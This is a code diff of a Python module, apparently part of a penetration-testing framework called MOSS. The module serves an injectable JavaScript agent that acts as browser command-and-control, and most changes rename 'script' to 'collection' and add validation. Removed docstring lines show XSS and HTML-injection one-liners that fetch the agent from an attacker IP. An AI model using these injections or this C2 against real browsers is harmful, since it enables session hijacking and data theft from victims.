@@ -1,30 +1,17 @@
 """
 ext/debugger.py
 
-Interactive JS Debugging Agent for MOSS.
+Browser-based interactive JS debugging agent / C2 for MOSS.
 
-Serves a JS payload for browser injection that executes JS commands
-received from a TUI prompt and returns results. Uses prompt_toolkit
-for a smoother TUI experience when available, with a plain input()
-fallback.
+Serves an eval-able JS payload for browser injection. The agent polls
+for pending commands from a TUI prompt, executes them, and posts results
+back. Supports encryption, collection files, and multi-browser targeting.
 
-All traffic can be encrypted with AES-256-GCM-derived XOR+MAC encryption
-over HTTP using --debugger-key (SHA-256 key derivation, stdlib-only).
+See docs/ext/DEBUGGER.md for full documentation.
 
 Usage:
     moss -e debugger -p 8000
     moss -e debugger -p 8000 --debugger-key "my secret passphrase"
-
-    Then find a HTML injection: <script src="http://IP:8000/debugger/{RANDOM}"></script>
-    
-    Or an XSS: javascript:eval(fetch("http://IP:8000/debugger/{RANDOM}"))
-
-CLI flags:
-    --debugger-path PATH          URL path for the JS payload (use {RANDOM} for random segment, default: /debugger/{RANDOM})
-    --debugger-id-length N        Length of the random path segment (default: 6)
-    --debugger-no-input           Disable the TUI input thread (for testing)
-    --debugger-minify-js          Minify the JS payload with rjsmin (optional)
-    --debugger-key KEYSTRING      Enable AES-256-GCM-style encryption with this passphrase (SHA-256 hashed)
 """
 
 from dataclasses import dataclass, field
@@ -258,7 +245,7 @@ def _xor_decrypt(key: bytes, encoded: str) -> dict:
 
 
 # ────────────────────────────────────────────────
-#   JSON Schema for script files
+#   JSON Schema for collections
 # ────────────────────────────────────────────────
 
 JSON_SCHEMA = {
@@ -268,7 +255,7 @@ JSON_SCHEMA = {
   "properties": {
     "name": {
       "type": "string",
-      "description": "Script name for namespacing commands (defaults to filename stem)"
+      "description": "Collection name for namespacing commands (defaults to filename stem)"
     },
     "commands": {
       "type": "object",
@@ -326,7 +313,7 @@ class DebuggerMixin:
     def __post_init__(self):
         self._pending = []
         self._connections = {}
-        self._script_commands = {}
+        self._collection_commands = {}
         self._lock = threading.Lock()
         self._next_id = int(time.time() * 1000)
         self._cmd_history = {}
@@ -395,47 +382,52 @@ class DebuggerMixin:
 
         self.status(f"[debugger] Debugger: {proto}://{hostname or '127.0.0.1'}:{self.port}{self.debugger_path}")
 
-    def _load_script_file(self, path: str) -> int:
+    def _load_collection_file(self, path: str) -> int:
         try:
             with open(path, "r", encoding="utf-8") as f:
                 data = json.load(f)
         except FileNotFoundError:
-            self.warning(f"[debugger] Script file not found: {path}")
+            self.warning(f"[debugger] Collection file not found: {path}")
             return 0
         except json.JSONDecodeError as e:
-            self.warning(f"[debugger] Invalid JSON in script file {path}: {e}")
+            self.warning(f"[debugger] Invalid JSON in collection file {path}: {e}")
             return 0
 
         try:
             import jsonschema
+            try:
+                jsonschema.validate(data, JSON_SCHEMA)
+            except jsonschema.ValidationError as e:
+                self.warning(f"[debugger] Collection file {path} failed schema validation: {e.message}")
+                return 0
         except ImportError:
-            self.warning(f"[debugger] jsonschema package not available — skipping schema validation for {path}")
+            self.warning(f"[debugger] jsonschema package not available — falling back to manual schema validation for {path}")
             self.warning(f"[debugger] ")
-            self.warning(f"[debugger] \tpip install jsonschema")
-            self.warning(f"[debugger] ")
-            return 0
+            if not isinstance(data, dict) or "commands" not in data:
+                self.warning(f"[debugger] Collection file {path} missing 'commands' field")
+                return 0
+            if not isinstance(data["commands"], dict):
+                self.warning(f"[debugger] Collection file {path} 'commands' must be an object")
+                return 0
 
-        try:
-            jsonschema.validate(data, JSON_SCHEMA)
-        except jsonschema.ValidationError as e:
-            self.warning(f"[debugger] Script file {path} failed schema validation: {e.message}")
-            return 0
-
-        script_name = data.get("name") or os.path.splitext(os.path.basename(path))[0]
-        commands = data.get("commands", {})
+        collection_name = data.get("name") or os.path.splitext(os.path.basename(path))[0]
+        commands = data["commands"]
         loaded = 0
         for cmd_name, cmd_def in commands.items():
-            key = f"{script_name}.{cmd_name}"
-            self._script_commands[key] = {
+            key = f"{collection_name}.{cmd_name}"
+            if not isinstance(cmd_def, dict) or "code" not in cmd_def:
+                self.warning(f"[debugger] Collection file {path}: command '{cmd_name}' missing 'code'")
+                continue
+            self._collection_commands[key] = {
                 "code": cmd_def["code"],
                 "description": cmd_def.get("description", ""),
                 "args": cmd_def.get("args", 0),
             }
             loaded += 1
-        print(f"  Loaded {loaded} command(s) from '{script_name}' ({path})")
+        print(f"  Loaded {loaded} command(s) from '{collection_name}' ({path})")
         return loaded
 
-    def _resolve_script_path(self, path: str):
+    def _resolve_collection_path(self, path: str):
         if os.path.isabs(path):
             if os.path.isfile(path):
                 return path
@@ -501,8 +493,8 @@ class DebuggerMixin:
                         print("  /target            broadcast to all browsers (default)")
                         print("  /broadcast <cmd>   send command to all browsers regardless of target")
                         print("  /clear             clear all pending commands")
-                        print("  /run [script[.cmd] [args...]]   list or execute script commands")
-                        print("  /load <path>       load a .json script file")
+                        print("  /run [collection[.cmd] [args...]]   list or execute collection commands")
+                        print("  /load <path>       load a .json collection file")
                         continue
                     elif cmd == "/conns":
                         if not self._connections:
@@ -534,24 +526,24 @@ class DebuggerMixin:
                     elif cmd == "/run":
                         run_parts = shlex.split(arg) if arg else []
                         if not run_parts:
-                            scripts = set()
-                            for key in self._script_commands:
+                            collections = set()
+                            for key in self._collection_commands:
                                 name = key.split(".", 1)[0]
-                                scripts.add(name)
-                            if not scripts:
-                                print("  (no script commands loaded)")
+                                collections.add(name)
+                            if not collections:
+                                print("  (no collection commands loaded)")
                             else:
-                                for script in sorted(scripts):
-                                    cmds = [k.split(".", 1)[1] for k in sorted(self._script_commands) if k.startswith(f"{script}.")]
-                                    print(f"  {script}: {', '.join(cmds)}")
+                                for collection in sorted(collections):
+                                    cmds = [k.split(".", 1)[1] for k in sorted(self._collection_commands) if k.startswith(f"{collection}.")]
+                                    print(f"  {collection}: {', '.join(cmds)}")
                             continue
                         key = run_parts[0]
                         cmd_args = run_parts[1:]
                         if "." in key:
-                            if key not in self._script_commands:
+                            if key not in self._collection_commands:
                                 print(f"  Unknown command: {key}")
                                 continue
-                            cmd_def = self._script_commands[key]
+                            cmd_def = self._collection_commands[key]
                             expected = cmd_def["args"]
                             if len(cmd_args) != expected:
                                 print(f"  Error: '{key}' expects {expected} arg(s), got {len(cmd_args)}")
@@ -562,14 +554,14 @@ class DebuggerMixin:
                             print(f"  Queued: {key}")
                             _cmd_label = key + (" " + " ".join(cmd_args) if cmd_args else "")
                         else:
-                            script_name = key
-                            cmds = [k for k in sorted(self._script_commands) if k.startswith(f"{script_name}.")]
+                            collection_name = key
+                            cmds = [k for k in sorted(self._collection_commands) if k.startswith(f"{collection_name}.")]
                             if not cmds:
-                                print(f"  Unknown script: {script_name}")
+                                print(f"  Unknown collection: {collection_name}")
                                 continue
-                            print(f"  Script: {script_name}")
+                            print(f"  Collection: {collection_name}")
                             for k in cmds:
-                                d = self._script_commands[k]
+                                d = self._collection_commands[k]
                                 desc = d.get("description", "")
                                 args = d.get("args", 0)
                                 label = f" ({desc})" if desc else ""
@@ -579,11 +571,11 @@ class DebuggerMixin:
                         if not arg:
                             print("  Usage: /load <path>")
                             continue
-                        resolved = self._resolve_script_path(arg)
+                        resolved = self._resolve_collection_path(arg)
                         if resolved is None:
-                            print(f"  Script not found: {arg}")
+                            print(f"  Collection not found: {arg}")
                             continue
-                        self._load_script_file(resolved)
+                        self._load_collection_file(resolved)
                         continue
                     else:
                         print(f"  Unknown command: {cmd}. Try /help")
